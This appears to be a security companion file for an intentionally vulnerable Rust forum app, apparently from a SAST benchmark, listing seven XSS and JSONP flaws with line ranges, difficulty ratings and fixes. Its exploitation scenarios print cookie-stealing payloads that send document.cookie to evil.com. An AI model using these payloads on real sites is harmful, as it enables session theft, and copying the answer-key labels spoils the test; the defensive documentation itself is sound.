# Security Companion Document: main.rs

## Language Exclusion Note: C and C++

C and C++ are excluded from the XSS vulnerability class because they are not typical web templating languages. While C and C++ can serve HTTP responses (e.g., via libmicrohttpd or cpp-httplib), they do not have standard HTML templating engines or web frameworks that produce dynamic HTML in the way that Python (Flask/Jinja2), Java (Spring Boot/Thymeleaf), Go (html/template), Rust (Actix-web), and JavaScript (Express.js) do. XSS vulnerabilities arise from the interaction between server-side code and HTML rendering in a browser, which is a pattern native to higher-level web frameworks rather than systems programming languages.

---

## Vulnerability: Stored XSS via Post Title and Content on Index Page

**CWE:** CWE-79
**OWASP:** A03
**Complexity Level:** Obvious
**Detection Difficulty:** Easily_Detectable
**Affected Lines:** L79-L92

### Description
The index function renders post titles and content directly into HTML without escaping. The title is rendered via `format!("<h2><a href='/thread/{}'>{}</a></h2>", post.id, post.title)` and the content preview via `format!("<p>{}</p>", preview)`. All fields are stored from user form input without sanitization.

### Exploitation Scenario
An attacker creates a thread with title `<script>document.location='http://evil.com/?c='+document.cookie</script>`. When any user visits the home page, the script executes in their browser, stealing their session cookie.

### Remediation Guidance
Use HTML escaping before embedding in HTML:
```rust
fn escape_html(s: &str) -> String {
    s.replace('&', "&amp;").replace('<', "&lt;").replace('>', "&gt;").replace('"', "&quot;")
}
page.push_str(&format!("<h2><a href='/thread/{}'>{}</a></h2>", post.id, escape_html(&post.title)));
```

### Complexity Rationale
This is rated Obvious because user-supplied data stored in the Post struct is directly formatted into HTML output with no escaping, a textbook stored XSS pattern.

### Detection Difficulty Rationale
This is rated Easily_Detectable because the direct string formatting of stored data into HTML via `format!` is a straightforward pattern for SAST tools.

---

## Vulnerability: Stored XSS via Post Content on Thread View Page

**CWE:** CWE-79
**OWASP:** A03
**Complexity Level:** Obvious
**Detection Difficulty:** Easily_Detectable
**Affected Lines:** L119-L127

### Description
The view_thread function renders the post title, author, and content directly into HTML without escaping. The content is rendered via `format!("<div style='margin: 20px 0; line-height: 1.6;'>{}</div>", post.content)`. The post data is stored from user form input.

### Exploitation Scenario
An attacker creates a thread with content containing `<img src=x onerror="fetch('http://evil.com/?c='+document.cookie)">`. When any user views the thread, the onerror handler fires and exfiltrates their cookies.

### Remediation Guidance
Escape all user-supplied fields before rendering:
```rust
page.push_str(&format!("<h1>{}</h1>", escape_html(&post.title)));
page.push_str(&format!("<div>{}</div>", escape_html(&post.content)));
```

### Complexity Rationale
This is rated Obvious because user-supplied data flows directly from storage into HTML output with no escaping.

### Detection Difficulty Rationale
This is rated Easily_Detectable because the taint flow from stored data to HTML output via format! is a standard pattern.

---

## Vulnerability: Stored XSS via Comment Author and Body

**CWE:** CWE-79
**OWASP:** A03
**Complexity Level:** Moderate
**Detection Difficulty:** Pattern_Dependent
**Affected Lines:** L132-L134

### Description
The view_thread function renders comment author and body fields directly into HTML without escaping via `format!("<strong>{}</strong>", cm.author)` and `format!("<p>{}</p>", cm.body)`. The comment data is stored from form submission in the add_reply function and later rendered in view_thread.

### Exploitation Scenario
An attacker submits a reply with body `<script>alert(document.cookie)</script>`. When any user views the thread, the injected script executes in their browser.

### Remediation Guidance
Escape comment fields before rendering:
```rust
page.push_str(&format!("<strong>{}</strong>", escape_html(&cm.author)));
page.push_str(&format!("<p>{}</p>", escape_html(&cm.body)));
```

### Complexity Rationale
This is rated Moderate because the data flows from the add_reply POST handler through in-memory storage in the comments HashMap before being rendered in the view_thread GET handler, requiring a reviewer to trace the data flow across two async functions.

### Detection Difficulty Rationale
This is rated Pattern_Dependent because SAST tools need to track the taint from form parameters through the Comment struct storage and into the rendering loop in a separate function.

---

## Vulnerability: Reflected XSS via Search Query with Partial Escaping

**CWE:** CWE-79
**OWASP:** A03
**Complexity Level:** Nuanced
**Detection Difficulty:** Likely_Missed
**Affected Lines:** L228-L259

### Description
The search_page function reflects the query parameter `q` in multiple locations with inconsistent escaping. The query is embedded unescaped in the search input value attribute (line 230), the results heading (line 237), and the search highlighting logic (line 246). However, the content preview on line 256-258 uses `.replace('<', "&lt;").replace('>', "&gt;")`, creating a false sense of security while the query itself remains unescaped in other contexts.

### Exploitation Scenario
An attacker crafts `http://localhost:8086/search?q="><script>alert(1)</script>` which breaks out of the input value attribute. The query is also reflected unescaped in the results heading and the highlighting replacement.

### Remediation Guidance
Escape the query parameter consistently in all output contexts:
```rust
let safe_q = q.replace('&', "&amp;").replace('<', "&lt;").replace('>', "&gt;").replace('"', "&quot;");
page.push_str(&format!(r#"<input type="text" name="q" value="{}">"#, safe_q));
page.push_str(&format!("<h2>Results for: {}</h2>", safe_q));
```

### Complexity Rationale
This is rated Nuanced because the content preview applies partial HTML escaping (replacing < and >), creating an inconsistent pattern. A reviewer seeing the escape logic may assume all outputs are protected, missing the unescaped query in the input attribute and heading.

### Detection Difficulty Rationale
This is rated Likely_Missed because the presence of manual HTML escaping in the same function may cause SAST tools to reduce severity, and the multiple injection points across different HTML contexts require comprehensive taint analysis.

---

## Vulnerability: Stored XSS via Profile Fields with Attribute Injection

**CWE:** CWE-79
**OWASP:** A03
**Complexity Level:** Moderate
**Detection Difficulty:** Pattern_Dependent
**Affected Lines:** L279-L287

### Description
The profile_page function renders user profile fields (display_name, bio, website) directly into HTML without escaping. The website field is injected into both an href attribute and link text via `format!("<a href='{}'>{}</a>", profile.website, profile.website)`. The data flows from form submission through cookie-based user lookup before rendering.

### Exploitation Scenario
An attacker registers with website `javascript:alert(document.cookie)` to create a clickjacking link, or sets bio to `<script>fetch('http://evil.com/steal?c='+document.cookie)</script>`. When any user views the profile, the malicious content executes.

### Remediation Guidance
Escape all profile fields and validate URLs:
```rust
page.push_str(&format!("<h1>{}</h1>", escape_html(&profile.display_name)));
page.push_str(&format!("<div><strong>Bio:</strong> {}</div>", escape_html(&profile.bio)));
```

### Complexity Rationale
This is rated Moderate because the vulnerability spans multiple fields and output contexts (HTML body and href attribute), and the data flow involves cookie-based authentication to retrieve stored profile data.

### Detection Difficulty Rationale
This is rated Pattern_Dependent because SAST tools need to trace data from form submission through in-memory storage, cookie-based retrieval, and into multiple HTML output contexts.

---

## Vulnerability: Reflected XSS via Error Message Parameter

**CWE:** CWE-79
**OWASP:** A03
**Complexity Level:** Obvious
**Detection Difficulty:** Easily_Detectable
**Affected Lines:** L352-L355

### Description
The error_page function embeds the `msg` query parameter directly into HTML using `format!("{}<h1>Error</h1><div style='color:red;'><p>{}</p></div>...", HEADER, msg, FOOTER)`. The message is taken from the query string with no escaping.

### Exploitation Scenario
An attacker crafts `http://localhost:8086/error?msg=<script>alert('XSS')</script>` and shares the link. The script executes when the victim visits the URL.

### Remediation Guidance
Escape the error message:
```rust
let safe_msg = msg.replace('&', "&amp;").replace('<', "&lt;").replace('>', "&gt;");
let page = format!("{}<h1>Error</h1><div style='color:red;'><p>{}</p></div>", HEADER, safe_msg);
```

### Complexity Rationale
This is rated Obvious because the query parameter is directly formatted into HTML output with no processing.

### Detection Difficulty Rationale
This is rated Easily_Detectable because direct string formatting of a query parameter into HTML is a textbook reflected XSS pattern.

---

## Vulnerability: JSONP Callback Injection in API Endpoint

**CWE:** CWE-79
**OWASP:** A03
**Complexity Level:** Nuanced
**Detection Difficulty:** Likely_Missed
**Affected Lines:** L379-L383

### Description
The api_posts endpoint supports a `callback` query parameter for JSONP responses. The callback value is embedded directly into the response via `format!("{}({})", cb, json_data)` and served with `Content-Type: application/javascript`. No validation is performed on the callback parameter.

### Exploitation Scenario
An attacker crafts `http://localhost:8086/api/posts?callback=alert(document.cookie)//` which produces `alert(document.cookie)//(...)`. When loaded via a `<script>` tag, this executes arbitrary JavaScript.

### Remediation Guidance
Validate the callback parameter:
```rust
let valid = cb.chars().all(|c| c.is_alphanumeric() || c == '_' || c == '$');
if valid {
    return HttpResponse::Ok().content_type("application/javascript").body(format!("{}({})", cb, json_data));
}
```
Or remove JSONP support and use CORS headers instead.

### Complexity Rationale
This is rated Nuanced because JSONP callback injection is a less commonly recognized XSS vector that operates in a JavaScript execution context rather than an HTML context.

### Detection Difficulty Rationale
This is rated Likely_Missed because most SAST tools focus on HTML-context XSS and may not flag JSONP callback injection as a cross-site scripting vulnerability.
